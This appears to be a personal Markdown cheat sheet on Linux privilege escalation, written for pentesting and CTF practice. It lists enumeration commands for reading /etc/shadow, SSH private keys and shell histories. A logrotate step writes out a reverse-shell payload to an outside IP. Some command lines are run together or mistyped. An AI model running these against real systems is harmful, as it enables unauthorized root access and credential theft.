Linux Privesc 

## Process working on the machine to check

- Monitor process : ```pspy```

## SUID

- gtfobins

## Ways to escalate

- Using SUID to become root : https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

- Use LinuxPrivChecker or LinEnum, or https://github.com/pentestmonkey/unix-privesc-check or linux smart enumeration.

- Search file in the home directory

- Find the file with suid : ```find / -perm -u=s -type f 2>/dev/null```


- ```sudo -l``` to find what can be used with that user as a root !!!!
You have the application, and where you have to use if you want to do it without password pay attention !!!! If it's a particular user, do : ```sudo -u <user> <command>```


- logrotate : if it's executed by the root user with a crontask, and you have control on a log file, use logrotten : add lot of things inside log file, check if the size after the logrotate command has changed. If it's okay :  bash -c "bash -i >& /dev/tcp/10.10.14.12/1234 0>&1" in a file (payload for example). Then ./logrotten -p payload \<path to the log file which is rotate\>. Then write data inside the log file : echo "blabla" > \<log file\>

- python library hijacking : https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html


- Any interpreter with Right of other user ? try to execute bash command. (/bin/bash)

---

## What's the distribution type? What version? :

```
- cat /etc/issue 
- cat /etc/*-release   
- cat /etc/lsb-release
- cat /etc/redhat-release
```
---

## What's the kernel version? Is it 64-bit?

```
- cat /proc/version 
- uname -a 
- uname -mrs 
- rpm -q kernel 
- dmesg | grep Linux 
- ls /boot | grep vmlinuz
```
---

## What can be learnt from the environmental variables?

```
- cat /etc/profile 
- cat /etc/bashrc 
- cat ~/.bash_profile 
- cat ~/.bashrc 
- cat ~/.bash_logout 
- env set  
```
---

## Is there a printer?
```
- lpstat -a  
```
---


## What services are running? Which service has which user privilege? 
```
- ps aux 
- ps -ef top 
- cat /etc/services  
- use pspy
- ps aux | grep root ps -ef | grep root  
```
---

## What applications are installed? What version are they? Are they currently running?
```
- ls -alh /usr/bin/ 
- ls -alh /sbin/ 
- dpkg -l 
- rpm -qa 
- ls -alh /var/cache/apt/archivesO 
- ls -alh /var/cache/yum/  
```
---

## Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
```
- cat /etc/syslog.conf 
- cat /etc/chttp.conf 
- cat /etc/lighttpd.conf 
- cat /etc/cups/cupsd.conf 
- cat /etc/inetd.conf 
- cat /etc/apache2/apache2.conf 
- cat /etc/my.conf 
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf 
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/  |
```
---

## What jobs are scheduled?

```
- crontab -l 
- ls -alh /var/spool/cron 
- ls -al /etc/ | grep cron 
- ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root  
```

---

## Any plain text usernames and/or passwords?

```
- grep -i user [filename] 
- grep -i pass [filename] 
- grep -C 5 "password" [filename] 
- find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   
```

---

## What NIC(s) does the system have? Is it connected to another network?

```
- /sbin/ifconfig -a 
- cat /etc/network/interfaces 
- cat /etc/sysconfig/network  
```

---

## What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?

```
- cat /etc/resolv.conf 
- cat /etc/sysconfig/network 
- cat /etc/networks 
- iptables -L hostname dnsdomainname 
```

---

## Whats cached? IP and/or MAC addresses


- ```arp -e route /sbin/route -nee```

---

## Is packet sniffing possible? What can be seen? Listen to live traffic

```
- tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21  
```
Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]

---

## Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?

```
- cat /etc/passwd | cut -d: -f1    
- grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
- awk -F: '($3 == "0") {print}' /etc/passwd 
- cat /etc/sudoers 
- sudo -l 
```
---

## What sensitive files can be found?

```
- cat /etc/passwd 
- cat /etc/group 
- cat /etc/shadow 
- ls -alh /var/mail
```
---

## Anything "interesting" in the home directorie(s)? If it's possible to access

```
- ls -ahlR /root/ 
- ls -ahlR /home/  
```
---

## Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
```
- cat /var/apache2/config.inc 
- cat /var/lib/mysql/mysql/user.MYD 
- cat /root/anaconda-ks.cfg  
```
---

## What has the user being doing? Is there any password in plain text? What have they been edting?
```
- cat ~/.bash_history 
- cat ~/.nano_history 
- cat ~/.atftp_history 
- cat ~/.mysql_history 
- cat ~/.php_history  
```
---

## What user information can be found?
```
- cat ~/.bashrc 
- cat ~/.profile 
- cat /var/mail/root 
- cat /var/spool/mail/root 
```
---

## Can private-key information be found?
```
- cat ~/.ssh/authorized_keys 
- cat ~/.ssh/identity.pub 
- cat ~/.ssh/identity 
- cat ~/.ssh/id_rsa.pub 
- cat ~/.ssh/id_rsa 
- cat ~/.ssh/id_dsa.pub 
- cat ~/.ssh/id_dsa 
- cat /etc/ssh/ssh_config 
- cat /etc/ssh/sshd_config 
- cat /etc/ssh/ssh_host_dsa_key.pub 
- cat /etc/ssh/ssh_host_dsa_key 
- cat /etc/ssh/ssh_host_rsa_key.pub 
- cat /etc/ssh/ssh_host_rsa_key 
- cat /etc/ssh/ssh_host_key.pub 
- cat /etc/ssh/ssh_host_key  
```
---

## Which configuration files can be written in /etc/? Able to reconfigure a service?
```
- ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other  find /etc/ -readable -type f 2>/dev/null               # Anyone find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone  |
```
---

## What can be found in /var/ ?
```
- ls -alh /var/log 
- ls -alh /var/mail 
- ls -alh /var/spool 
- ls -alh /var/spool/lpd 
- ls -alh /var/lib/pgsql 
- ls -alh /var/lib/mysql 
- cat /var/lib/dhcp3/dhclient.leases  
```
---

## Any settings/files (hidden) on website? Any settings file with database information?
```
- ls -alhR /var/www/ 
- ls -alhR /srv/www/htdocs/ 
- ls -alhR /usr/local/www/apache22/data/ 
- ls -alhR /opt/lampp/htdocs/ 
- ls -alhR /var/www/html/  |
```
---
## Is there anything in the log file(s) (Could help with "Local File Includes"!)
```
- cat /etc/httpd/logs/access_log 
- cat /etc/httpd/logs/error_log 
- cat /var/log/apache2/access_log 
- cat /var/log/apache2/error_log 
- cat /var/log/apache/access_log 
- cat /var/log/auth.log 
- cat /var/log/chttp.log 
- cat /var/log/cups/error_log 
- cat /var/log/dpkg.log 
- cat /var/log/faillog 
- cat /var/log/httpd/access.log 
- cat /var/log/httpd/error_log 
- cat /var/log/lastlog 
- cat /var/log/lighttpd/access.log 
- cat /var/log/lighttpd/error.log 
- cat /var/log/lighttpd/lighttpd.access.log 
- cat /var/log/lighttpd/lighttpd.error.log 
- cat /var/log/messages 
- cat /var/log/secure 
- cat /var/log/syslog 
- cat /var/log/wtmp 
- cat /var/log/xferlog 
- cat /var/log/yum.log 
- cat /var/run/utmp 
- cat /var/webmin/miniserv.log 
- cat /var/www/logs/access_log 
- cat /var/www/logs/access.log 
- ls -alh /var/lib/dhcp3/ 
- ls -alh /var/log/postgresql/ 
- ls -alh /var/log/proftpd/ 
- ls -alh /var/log/samba/  
- Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp  
```
---

## How are file-systems mounted?
```
- mount df -h  |
```

## Are there any unmounted file-systems?
```
- cat /etc/fstab  |
```
---

## Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
```
- find / -writable -type d 2>/dev/null      
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / -perm -o x -type d 2>/dev/null
- find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
---

## What development tools/languages are installed/supported?
```
- find / -name perl* 
- find / -name python* 
- find / -name gcc* 
- find / -name cc  
- etc ....
```
---

## File owned by a ueser : 
```
- find / -user \<user\> -exec ls -l {} + 2>/dev/null
```
---

## Are services running with the minimum level of privileges required?

## For example, do you need to run MySQL as root?


## Having access to /etc/passw :
https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/


## Crontab to root:
https://www.hackingarticles.in/hack-the-box-challenge-solid-state-walkthrough/
https://v3ded.github.io/ctf/htb-europa.html


## CHECK NETWORK 
- ```netat -antup```
- if it's 127.0.0.1:<port> : it's a loopback, it's not accessible from the outside


## Tmux owned by root ?
- https://v3ded.github.io/ctf/htb-valentine.html


## check su :
- https://0xdf.gitlab.io/2019/01/05/htb-mischief.html


